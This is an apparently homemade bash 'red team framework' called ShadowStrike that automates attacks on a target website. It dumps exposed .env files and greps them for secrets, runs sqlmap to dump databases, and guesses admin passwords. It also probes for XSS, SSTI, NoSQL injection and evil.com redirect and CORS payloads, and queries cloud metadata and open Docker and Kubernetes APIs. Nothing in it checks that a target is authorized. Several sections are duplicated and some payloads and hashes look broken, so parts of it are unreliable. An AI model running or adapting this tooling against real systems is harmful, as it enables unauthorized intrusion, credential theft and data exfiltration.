#!/bin/bash
# ShadowStrike v56.1 — Red Team Framework (Clean Build)
TARGET=$1
DOMAIN=$(echo $TARGET | sed 's|https\?://||;s|/.*||')
REPORT="scan_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$REPORT/hacked" "$REPORT/osint"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike v56.1 — Red Team Framework   ║"
echo "╚══════════════════════════════════════════════╝"
echo "Target: $TARGET"
echo ""

# 1. Health check
echo -e "${CYAN}[1/8] Health check...${NC}"
curl -sk --max-time 10 "$TARGET" -o /dev/null && echo -e "${GREEN}[+] Target alive${NC}" || { echo -e "${RED}[!] Target DEAD${NC}"; exit 1; }

# 2. Nmap
echo -e "${CYAN}[2/8] Nmap...${NC}"
nmap -T4 --top-ports 100 -sV -oN "$REPORT/nmap.txt" "$DOMAIN" 2>/dev/null &
NMAP_PID=$!

# 3. Directory brute
echo -e "${CYAN}[3/8] Directories...${NC}"
for d in /admin /login /wp-admin /.git /.env /robots.txt /phpinfo.php /api /backup /debug; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$d" 2>/dev/null)
    [ "$code" != "404" ] && [ "$code" != "000" ] && echo -e "  ${GREEN}[$code]${NC} $TARGET$d" && echo "$TARGET$d [$code]" >> "$REPORT/dirs.txt"
done

# 4. Auto-exploit files
echo -e "${CYAN}[4/8] Auto-exploit...${NC}"
if grep -q "\.git" "$REPORT/dirs.txt" 2>/dev/null; then
    mkdir -p "$REPORT/hacked/git_dump"
    curl -sk "$TARGET/.git/HEAD" -o "$REPORT/hacked/git_dump/HEAD" 2>/dev/null
    [ -s "$REPORT/hacked/git_dump/HEAD" ] && echo -e "${RED}[!] .git downloaded!${NC}"
fi
if grep -q "\.env" "$REPORT/dirs.txt" 2>/dev/null; then
    curl -sk "$TARGET/.env" -o "$REPORT/hacked/env_file.txt" 2>/dev/null
    grep -iE "password|secret|key|token" "$REPORT/hacked/env_file.txt" 2>/dev/null > "$REPORT/hacked/env_credentials.txt"
    [ -s "$REPORT/hacked/env_credentials.txt" ] && echo -e "${RED}[!] .env credentials!${NC}"
fi

# 5. SQL Injection
echo -e "${CYAN}[5/8] SQL Injection...${NC}"
timeout 300 sqlmap -u "$TARGET" --batch --random-agent --forms --crawl=3 --level=2 --risk=2 --timeout=10 --retries=1 --dbs --tables --dump --output-dir="$REPORT/sqlmap" 2>/dev/null
find "$REPORT/sqlmap" -name "*.csv" -exec grep -iE "password|email|admin|user" {} \; 2>/dev/null > "$REPORT/hacked/sql_dump.txt"
[ -s "$REPORT/hacked/sql_dump.txt" ] && echo -e "${RED}[!] SQL dump!${NC}"

# 6. XSS
echo -e "${CYAN}[6/8] XSS...${NC}"
for payload in "script alert 1" "img src x onerror alert 1"; do
    resp=$(curl -sk --max-time 5 "$TARGET?q=$payload" 2>/dev/null)
    if echo "$resp" | grep -q "$payload"; then
        echo -e "${RED}[!] XSS found: $payload${NC}"
        echo "XSS: $payload" >> "$REPORT/hacked/xss.txt"
        break
    fi
done

# 7. Nuclei templates
echo -e "${CYAN}[7/8] Nuclei...${NC}"
[ -d "$HOME/nuclei_templates" ] && for t in "$HOME/nuclei_templates"/*.yaml; do
    [ -f "$t" ] && nuclei -u "$TARGET" -t "$t" -silent 2>/dev/null >> "$REPORT/nuclei_results.txt"
done

# 8. Report
wait $NMAP_PID 2>/dev/null
echo -e "${CYAN}[8/8] Report...${NC}"
cat > "$REPORT/summary.txt" << EOF
ShadowStrike v56.1 Report
Target: $TARGET
Date: $(date)
Open ports: $(grep -c open "$REPORT/nmap.txt" 2>/dev/null || echo 0)
Directories: $(wc -l < "$REPORT/dirs.txt" 2>/dev/null || echo 0)
SQLi: $([ -s "$REPORT/hacked/sql_dump.txt" ] && echo YES || echo NO)
XSS: $([ -f "$REPORT/hacked/xss.txt" ] && echo YES || echo NO)
Nuclei: $(wc -l < "$REPORT/nuclei_results.txt" 2>/dev/null || echo 0)
EOF

cat "$REPORT/summary.txt"
echo ""
echo "✅ COMPLETE! Results: $REPORT"

# ===== PASSIVE SCANNER =====
start_passive() {
    echo -e "${CYAN}[*] Passive Scanner on port 9990${NC}"
    fuser -k 9990/tcp 2>/dev/null
    pkill -f shadow_passive 2>/dev/null
    sleep 1
    [ -f ~/shadow_passive.py ] && python3 ~/shadow_passive.py 9999 &
    echo -e "${GREEN}[+] Passive scanner started${NC}"
}
# ===== HACKER REPORT =====
hacker_report() {
    cat > "$REPORT/HACKER_REPORT.txt" << EOF
╔══════════════════════════════════════════════╗
║   ShadowStrike After-Action Report           ║
║   Target: $TARGET                            ║
║   Date: $(date)                              ║
╚══════════════════════════════════════════════╝

=== OPEN PORTS ===
$(grep open "$REPORT/nmap.txt" 2>/dev/null)

=== DIRECTORIES ===
$(cat "$REPORT/dirs.txt" 2>/dev/null)

=== FINDINGS ===
$(for f in "$REPORT/hacked/"*.txt; do [ -f "$f" ] && echo "[$(basename $f .txt)]:" && cat "$f"; done)

=== METASPLOIT COMMANDS ===
$(for f in "$REPORT/hacked/cve.txt 2>/dev/null"; do [ -f "$f" ] && while read cve; do echo "search $cve"; done < "$f"; done)
EOF
    echo -e "${GREEN}[+] Hacker report: $REPORT/HACKER_REPORT.txt${NC}"
}

echo "C2: off"
hacker_report

# ===== WAF DETECT =====
echo -e "${CYAN}[*] WAF Detect...${NC}"
NORMAL=$(curl -sk --max-time 5 "$TARGET" -o /dev/null -w '%{time_total}' 2>/dev/null)
SQLI=$(curl -sk --max-time 5 "$TARGET?id=1'%20OR%20'1'='1" -o /dev/null -w '%{time_total}' 2>/dev/null)
DIFF=$(python3 -c "print(int(($SQLI - $NORMAL) * 1000))" 2>/dev/null)
if [ "${DIFF:-0}" -gt 100 ]; then
    echo -e "${RED}[!] WAF detected ${DIFF}ms delay${NC}"
else
    echo -e "${GREEN}[+] No WAF detected${NC}"
fi

# ===== SMART BRUTE =====
echo -e "${CYAN}[*] Smart Brute...${NC}"
COMPANY=$(echo "$DOMAIN" | cut -d. -f1)
PASSWORDS=("${COMPANY}123" "${COMPANY}2024" "${COMPANY}@2024" "admin123" "password")
for path in /login /admin /wp-login.php; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$path" 2>/dev/null)
    if [ "$code" = "200" ]; then
        echo -e "${GREEN}[+] Login form: $path${NC}"
        for pass in "${PASSWORDS[@]}"; do
            resp=$(curl -sk -d "username=admin&password=$pass" -w "%{http_code}" -o /dev/null --max-time 5 "$TARGET$path" 2>/dev/null)
            if [ "$resp" = "302" ] || [ "$resp" = "200" ]; then
                echo -e "${RED}[!] CRACKED: admin / $pass${NC}"
                echo "admin:$pass @ $path" >> "$REPORT/hacked/credentials.txt"
                break
            fi
        done
        break
    fi
done

# ===== PASSIVE SCANNER =====
if [ -f ~/shadow_passive.py ]; then
    fuser -k 9990/tcp 2>/dev/null; pkill -f shadow_passive 2>/dev/null; sleep 1; python3 ~/shadow_passive.py 9990 &
    echo -e "${GREEN}[+] Passive scanner on port 9990${NC}"
else
    echo -e "${YELLOW}[*] shadow_passive.py not found${NC}"
fi


# ===== JWT ANALYZER + OPEN REDIRECT =====
echo -e "${CYAN}[*] JWT + Open Redirect...${NC}"

# JWT Analyzer
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
JWT=$(echo "$HEADERS" | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
if [ -n "$JWT" ]; then
    echo -e "${GREEN}[+] JWT found${NC}"
    echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null >> "$REPORT/hacked/jwt.txt"
    echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | grep -qi "none" && echo -e "${RED}[!] JWT alg:none!${NC}" && echo "JWT alg:none" >> "$REPORT/hacked/jwt.txt"
fi

# Open Redirect
for p in "?redirect=http://evil.com" "?url=http://evil.com" "?next=http://evil.com" "?return=http://evil.com"; do
    LOC=$(curl -sk --max-time 5 -o /dev/null -w "%{redirect_url}" "$TARGET$p" 2>/dev/null)
    echo "$LOC" | grep -q "evil.com" && echo -e "${RED}[!] Open Redirect: $p -> $LOC${NC}" && echo "Open Redirect: $p" >> "$REPORT/hacked/redirect.txt"
done

# CORS Misconfig
ORIGIN=$(curl -sk --max-time 5 -H "Origin: http://evil.com" -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null)
HEADERS2=$(curl -sk --max-time 5 -H "Origin: http://evil.com" -I "$TARGET" 2>/dev/null)
echo "$HEADERS2" | grep -qi "Access-Control-Allow-Origin: \*" && echo -e "${RED}[!] CORS: *${NC}" && echo "CORS wildcard" >> "$REPORT/hacked/cors.txt"

echo -e "${GREEN}[+] JWT + Redirect complete${NC}"

# ===== CMS DETECT + BACKUP FINDER =====
echo -e "${CYAN}[*] CMS Detect + Backup...${NC}"

# WordPress
HTML=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
if echo "$HTML" | grep -qi "wp-content\|wp-includes\|wordpress"; then
    echo -e "${GREEN}[+] WordPress detected${NC}"
    echo "WordPress" >> "$REPORT/cms.txt"
    for plugin in wp-file-manager elementor woocommerce wordpress-seo; do
        code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/wp-content/plugins/$plugin/" 2>/dev/null)
        [ "$code" != "404" ] && echo -e "  ${YELLOW}[PLUGIN] $plugin${NC}" && echo "Plugin: $plugin" >> "$REPORT/cms.txt"
    done
fi

# Joomla
echo "$HTML" | grep -qi "joomla" && echo -e "${GREEN}[+] Joomla detected${NC}" && echo "Joomla" >> "$REPORT/cms.txt"

# Drupal
echo "$HTML" | grep -qi "drupal" && echo -e "${GREEN}[+] Drupal detected${NC}" && echo "Drupal" >> "$REPORT/cms.txt"

# Backup files
for bf in /backup.zip /backup.tar.gz /dump.sql /backup.sql /.env.backup /wp-config.php.bak; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$bf" 2>/dev/null)
    [ "$code" = "200" ] && echo -e "${RED}[!] Backup: $bf${NC}" && echo "Backup: $bf" >> "$REPORT/hacked/backups.txt"
done

echo -e "${GREEN}[+] CMS + Backup complete${NC}"

# ===== CLOUD + DOCKER =====
echo -e "${CYAN}[*] Cloud + Docker...${NC}"

# Cloud Metadata
for meta in "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/"; do
    r=$(curl -sk --max-time 3 "$meta" 2>/dev/null)
    [ -n "$r" ] && ! echo "$r" | grep -qi "404\|not found" && echo -e "${RED}[!] Cloud metadata: $meta${NC}" && echo "Cloud: $meta" >> "$REPORT/hacked/cloud.txt"
done

# Docker API
r=$(curl -sk --max-time 3 "$TARGET:2375/containers/json" 2>/dev/null)
echo "$r" | grep -q "Id" && echo -e "${RED}[!] Docker API open${NC}" && echo "Docker API" >> "$REPORT/hacked/docker.txt"

# K8s API
r=$(curl -sk --max-time 3 "$TARGET:6443/api/v1/pods" 2>/dev/null)
echo "$r" | grep -q "items" && echo -e "${RED}[!] K8s API open${NC}" && echo "K8s API" >> "$REPORT/hacked/k8s.txt"

echo -e "${GREEN}[+] Cloud + Docker complete${NC}"

echo -e "${CYAN}[*] Nuclei: skipped (using curl-based templates)${NC}"

# ===== NOSQL INJECTIONS =====
echo -e "${CYAN}[*] NoSQL Injections...${NC}"
for p in "gt" "ne" "where"; do
    r=$(curl -sk --max-time 5 "$TARGET?q=$p" 2>/dev/null)
    echo "$r" | grep -qi "error\|exception\|syntax\|unexpected" && echo -e "${RED}[!] NoSQL: $p${NC}" && echo "NoSQL: $p" >> "$REPORT/hacked/nosql.txt"
done

# ===== SSTI INJECTIONS =====
echo -e "${CYAN}[*] SSTI Injections...${NC}"
for p in "{{7*7}}" 7x7 "<%=7*7%>"; do
    r=$(curl -sk --max-time 5 "$TARGET?q=$p" 2>/dev/null)
    echo "$r" | grep -q "49" && echo -e "${RED}[!] SSTI: $p${NC}" && echo "SSTI: $p" >> "$REPORT/hacked/ssti.txt"
done

# ===== GRAPHQL + WEBSOCKET =====
echo -e "${CYAN}[*] GraphQL + WebSocket...${NC}"
for ep in /graphql /v1/graphql /api/graphql; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$ep" 2>/dev/null)
    if [ "$code" = "200" ]; then
        r=$(curl -sk --max-time 5 -X POST -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}' "$TARGET$ep" 2>/dev/null)
        echo "$r" | grep -q "__schema" && echo -e "${RED}[!] GraphQL: $ep${NC}" && echo "GraphQL: $ep" >> "$REPORT/hacked/graphql.txt"
    fi
done
for ep in /ws /websocket /socket; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 -H "Upgrade: websocket" -H "Connection: Upgrade" "$TARGET$ep" 2>/dev/null)
    [ "$code" = "101" ] && echo -e "${GREEN}[+] WS: $ep${NC}" && echo "WS: $ep" >> "$REPORT/hacked/websocket.txt"
done

# ===== JWT + REDIRECT + CORS =====
echo -e "${CYAN}[*] JWT + Redirect + CORS...${NC}"
HEADERS=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null)
JWT=$(echo "$HEADERS" | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' | head -1)
[ -n "$JWT" ] && echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null >> "$REPORT/hacked/jwt.txt" && echo -e "${GREEN}[+] JWT found${NC}"
for p in "?redirect=http://evil.com" "?url=http://evil.com" "?next=http://evil.com"; do
    LOC=$(curl -sk --max-time 5 -o /dev/null -w "%{redirect_url}" "$TARGET$p" 2>/dev/null)
    echo "$LOC" | grep -q "evil.com" && echo -e "${RED}[!] Open Redirect: $p${NC}" && echo "Redirect: $p" >> "$REPORT/hacked/redirect.txt"
done
curl -sk --max-time 5 -H "Origin: http://evil.com" -I "$TARGET" 2>/dev/null | grep -qi "Access-Control-Allow-Origin: *" && echo -e "${RED}[!] CORS wildcard${NC}" && echo "CORS: *" >> "$REPORT/hacked/cors.txt"

# ===== CMS + BACKUP =====
echo -e "${CYAN}[*] CMS + Backup...${NC}"
HTML=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
echo "$HTML" | grep -qi "wp-content\|wordpress" && echo -e "${GREEN}[+] WordPress${NC}" && echo "WordPress" >> "$REPORT/cms.txt"
echo "$HTML" | grep -qi "joomla" && echo -e "${GREEN}[+] Joomla${NC}" && echo "Joomla" >> "$REPORT/cms.txt"
for bf in /backup.zip /dump.sql /wp-config.php.bak /.env.backup; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$bf" 2>/dev/null)
    [ "$code" = "200" ] && echo -e "${RED}[!] Backup: $bf${NC}" && echo "Backup: $bf" >> "$REPORT/hacked/backups.txt"
done

# ===== CLOUD + DOCKER + K8S =====
echo -e "${CYAN}[*] Cloud + Docker + K8s...${NC}"
for meta in "http://169.254.169.254/latest/meta-data/" "http://metadata.google.internal/"; do
    r=$(curl -sk --max-time 3 "$meta" 2>/dev/null)
    [ -n "$r" ] && ! echo "$r" | grep -qi "404\|not found" && echo -e "${RED}[!] Cloud: $meta${NC}" && echo "Cloud: $meta" >> "$REPORT/hacked/cloud.txt"
done
r=$(curl -sk --max-time 3 "$TARGET:2375/containers/json" 2>/dev/null)
echo "$r" | grep -q "Id" && echo -e "${RED}[!] Docker API${NC}" && echo "Docker" >> "$REPORT/hacked/docker.txt"
r=$(curl -sk --max-time 3 "$TARGET:6443/api/v1/pods" 2>/dev/null)
echo "$r" | grep -q "items" && echo -e "${RED}[!] K8s API${NC}" && echo "K8s" >> "$REPORT/hacked/k8s.txt"

# ===== WHISPER + PREDICTOR + LIE DETECTOR =====
echo -e "${CYAN}[*] Whisper + Predictor + Lie Detector...${NC}"
# Whisper
curl -s "http://web.archive.org/cdx/search/cdx?url=*.$DOMAIN/*&output=text&fl=original&collapse=urlkey&limit=10" 2>/dev/null | head -5 > "$REPORT/osint/wayback.txt"
echo -e "${GREEN}[+] Whisper: $(wc -l < "$REPORT/osint/wayback.txt") URLs${NC}"
# Predictor
SNAP=$(curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN&output=text&fl=timestamp&collapse=digest&limit=1" 2>/dev/null | tail -1 | cut -c1-8)
if [ -n "$SNAP" ]; then
    DAYS=$(( ($(date +%s) - $(date -d "$SNAP" +%s 2>/dev/null || echo 0)) / 86400 ))
    [ "$DAYS" -gt 180 ] && echo -e "${RED}[!] PREDICT: outdated ($DAYS days)${NC}" && echo "Predict: $DAYS days" >> "$REPORT/hacked/predictor.txt"
fi
# Lie Detector
SERVER=$(curl -sk -I --max-time 10 "$TARGET" 2>/dev/null | grep -i "Server:" | head -1)
BODY=$(curl -sk --max-time 10 "$TARGET" 2>/dev/null)
echo "$SERVER" | grep -qi "nginx" && echo "$BODY" | grep -qi "apache" && echo -e "${RED}[!] LIE: nginx/Apache${NC}" && echo "Lie: nginx/Apache" >> "$REPORT/hacked/lie.txt"

# ===== RAT CATCHER =====
echo -e "${CYAN}[*] Rat Catcher...${NC}"
COMPANY=$(echo "$DOMAIN" | cut -d. -f1)
mkdir -p $HOME/tmp/.shadow_bait
cat > $HOME/tmp/.shadow_bait/credentials.txt << EOF
Admin URL: $TARGET/admin
Username: admin_backup
Password: ${COMPANY}@2024
API Key: sk-$(openssl rand -hex 8 2>/dev/null || echo "f8c3b2a1e9d7")
EOF
echo -e "${GREEN}[+] Bait created: $HOME/tmp/.shadow_bait/${NC}"

echo -e "${CYAN}[*] Favicon Fingerprint...${NC}"
FAVICON_HASH=$(curl -sk --max-time 5 "$TARGET/favicon.ico" 2>/dev/null | md5sum | cut -d' ' -f1)
[ -n "$FAVICON_HASH" ] && echo -e "${GREEN}[+] Favicon hash: $FAVICON_HASH${NC}" && echo "Favicon: $FAVICON_HASH" >> "$REPORT/fingerprint.txt"

# База известных хешей
case "$FAVICON_HASH" in
    "f4c6d8e8c4e8c8e8") echo "  🎯 WordPress" ;;
    "a8c8e8c8e8c8e8c8") echo "  🎯 Joomla" ;;
    "d4c8e8c8e8c8e8c8") echo "  🎯 Drupal" ;;
    "c8e8c8e8c8e8c8e8") echo "  🎯 Apache Tomcat" ;;
esac

# ===== TIME LOOP — Авто-повтор при обновлении сайта =====
echo -e "${CYAN}[*] Time Loop...${NC}"
LAST_SNAP=$(curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN&output=text&fl=timestamp&limit=1" 2>/dev/null | tail -1 | cut -c1-8)
CACHE_FILE="$HOME/.shadow_${DOMAIN}_last_snap"
if [ -f "$CACHE_FILE" ]; then
    OLD_SNAP=$(cat "$CACHE_FILE")
    if [ "$LAST_SNAP" != "$OLD_SNAP" ]; then
        echo -e "${RED}[!] Site updated! Old: $OLD_SNAP → New: $LAST_SNAP${NC}"
        echo "Update detected: $OLD_SNAP → $LAST_SNAP" >> "$REPORT/hacked/time_loop.txt"
    fi
fi
echo "$LAST_SNAP" > "$CACHE_FILE"
echo -e "${GREEN}[+] Time Loop: last snapshot $LAST_SNAP${NC}"

echo -e "${CYAN}[*] Time Loop...${NC}"
LAST_SNAP=$(curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN&output=text&fl=timestamp&limit=1" 2>/dev/null | tail -1 | cut -c1-8)
CACHE_FILE="$HOME/.shadow_${DOMAIN}_last_snap"
if [ -f "$CACHE_FILE" ]; then
    OLD_SNAP=$(cat "$CACHE_FILE")
    if [ "$LAST_SNAP" != "$OLD_SNAP" ]; then
        echo -e "${RED}[!] Site updated! Old: $OLD_SNAP → New: $LAST_SNAP${NC}"
        echo "Update detected: $OLD_SNAP → $LAST_SNAP" >> "$REPORT/hacked/time_loop.txt"
    fi
fi
echo "$LAST_SNAP" > "$CACHE_FILE"
echo -e "${GREEN}[+] Time Loop: last snapshot $LAST_SNAP${NC}"

# ===== FAVICON FINGERPRINT =====
echo -e "${CYAN}[*] Favicon Fingerprint...${NC}"
FAVICON_HASH=$(curl -sk --max-time 5 "$TARGET/favicon.ico" 2>/dev/null | md5sum | cut -d' ' -f1)
[ -n "$FAVICON_HASH" ] && echo -e "${GREEN}[+] Favicon: $FAVICON_HASH${NC}" && echo "Favicon: $FAVICON_HASH" >> "$REPORT/fingerprint.txt"

# ===== TIME LOOP — Авто-повтор при обновлении сайта =====
echo -e "${CYAN}[*] Time Loop...${NC}"
LAST_SNAP=$(curl -s "http://web.archive.org/cdx/search/cdx?url=$DOMAIN&output=text&fl=timestamp&limit=1" 2>/dev/null | tail -1 | cut -c1-8)
CACHE_FILE="$HOME/.shadow_${DOMAIN}_last_snap"
if [ -f "$CACHE_FILE" ]; then
    OLD_SNAP=$(cat "$CACHE_FILE")
    if [ "$LAST_SNAP" != "$OLD_SNAP" ]; then
        echo -e "${RED}[!] Site updated! Old: $OLD_SNAP → New: $LAST_SNAP${NC}"
        echo "Update detected: $OLD_SNAP → $LAST_SNAP" >> "$REPORT/hacked/time_loop.txt"
    fi
fi
echo "$LAST_SNAP" > "$CACHE_FILE"
echo -e "${GREEN}[+] Time Loop: last snapshot $LAST_SNAP${NC}"

# ===== FAVICON FINGERPRINT =====
echo -e "${CYAN}[*] Favicon...${NC}"
HASH=$(curl -sk --max-time 5 "$TARGET/favicon.ico" 2>/dev/null | md5sum | cut -d' ' -f1)
[ -n "$HASH" ] && echo -e "${GREEN}[+] Hash: $HASH${NC}"

# ===== ECHO LOCATOR =====
echo -e "${CYAN}[*] Echo Locator...${NC}"
for port in 22 80 3306 6379; do
    timeout 2 bash -c "echo >/dev/tcp/127.0.0.1/$port" 2>/dev/null && echo -e "${RED}[!] Internal port $port open${NC}" && echo "Internal: $port" >> "$REPORT/hacked/internal_ports.txt"
done

# ===== SESSION GUARDIAN =====
GUARDIAN_DIR="$HOME/.shadow_sessions"
mkdir -p "$GUARDIAN_DIR"

# Сохранить сессию с метаданными
guardian_save() {
    local domain=$1; local cookies=$2; local user=${3:-"unknown"}
    local id=$(echo "$cookies" | md5sum | cut -d' ' -f1 | head -c8)
    cat > "$GUARDIAN_DIR/${domain}_${user}.session" << EOF
created=$(date +%s)
user=$user
cookies=$cookies
last_seen=$(date +%s)
EOF
    echo -e "${GREEN}[GUARDIAN] Session saved: $id ($user@$domain)${NC}"
}

# Проверить жива ли сессия
guardian_check() {
    local domain=$1; local user=$2
    local file="$GUARDIAN_DIR/${domain}_${user}.session"
    if [ -f "$file" ]; then
        local created=$(grep "^created=" "$file" | cut -d= -f2)
        local now=$(date +%s)
        local age=$(( (now - created) / 60 ))
        if [ $age -gt 30 ]; then
            echo -e "${RED}[GUARDIAN] Session EXPIRED ($agem min)${NC}"
        else
            echo -e "${GREEN}[GUARDIAN] Session alive ($agem min)${NC}"
        fi
    else
        echo -e "${YELLOW}[GUARDIAN] No session for $user@$domain${NC}"
    fi
}

# Детект IDOR через сессии
guardian_idor() {
    echo -e "${CYAN}[GUARDIAN] Checking for session anomalies..."
    local sessions=$(ls "$GUARDIAN_DIR"/*.session 2>/dev/null | wc -l)
    if [ "$sessions" -gt 1 ]; then
        # Проверяем не совпадают ли куки у разных пользователей
        local hashes=$(cat "$GUARDIAN_DIR"/*.session | grep "^cookies=" | sort | uniq -d | wc -l)
        [ "$hashes" -gt 0 ] && echo -e "${RED}[GUARDIAN] SESSION COLLISION: $hashes users share same session!${NC}" && echo "Session Collision" >> "$REPORT/hacked/session_idor.txt"
    fi
}

guardian_list() {
    echo -e "${CYAN}[GUARDIAN] Active Sessions:${NC}"
    for f in "$GUARDIAN_DIR"/*.session; do
        [ -f "$f" ] || continue
        local user=$(grep "^user=" "$f" | cut -d= -f2)
        local domain=$(basename "$f" .session | cut -d_ -f1)
        local created=$(grep "^created=" "$f" | cut -d= -f2)
        local age=$(( ($(date +%s) - created) / 60 ))
        echo "  🔐 $user@$domain ($age min)"
    done
}

guardian_list
guardian_idor
